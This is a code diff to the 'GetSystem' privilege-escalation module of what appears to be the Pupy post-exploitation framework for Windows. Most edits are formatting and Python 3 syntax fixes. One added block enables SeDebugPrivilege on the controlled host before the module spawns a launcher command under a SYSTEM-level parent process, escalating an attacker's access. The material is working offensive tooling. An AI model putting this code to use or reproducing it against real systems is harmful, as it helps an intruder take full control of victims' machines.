@@ -7,7 +7,8 @@ from modules.lib.windows import powerloader
 
 import os
 
-__class_name__="GetSystem"
+__class_name__ = "GetSystem"
+
 
 @config(compat="windows", category="privesc")
 class GetSystem(PupyModule):
@@ -24,7 +25,7 @@ class GetSystem(PupyModule):
     This payload listens on your given port on the target. You have to connect to this launcher manually.
     """
 
-    dependencies=["pupwinutils.security", "pupwinutils.processes"]
+    dependencies = ["pupwinutils.security", "pupwinutils.processes"]
 
     @classmethod
     def init_argparse(cls):
@@ -66,7 +67,7 @@ class GetSystem(PupyModule):
         cmdToExecute = None
 
         # The the local file which contains PS1 script (when powershell chosen or enabled automcatically)
-        local_file  = ''
+        local_file = ''
 
         # True if ps1 script will be used in bind mode. If reverse connection with ps1 then False
         isBindLauncherForPs1 = False
@@ -139,6 +140,13 @@ class GetSystem(PupyModule):
                     'be specified with one of -x/-p/-r args')
                 return
 
+            try:
+                enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)
+                enable_privilege('SeDebugPrivilege')
+                self.success('{} enabled'.format('SeDebugPrivilege'))
+            except Exception as e:
+                self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))
+
             create_new_process_from_ppid = self.client.remote(
                 'pupwinutils.security', 'create_new_process_from_ppid', False)
 
@@ -165,14 +173,14 @@ class GetSystem(PupyModule):
                         continue
 
                     self.info("{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it".format(
-                        aprocess['name'],aprocess['pid']))
+                        aprocess['name'], aprocess['pid']))
 
                     try:
                         pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)
                         self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))
                         break
 
-                    except Exception, e:
+                    except Exception as e:
                         self.error('Failed: {}'.format(' '.join(x for x in e.args if type(x) is str)))
 
         elif args.method == 'impersonate':
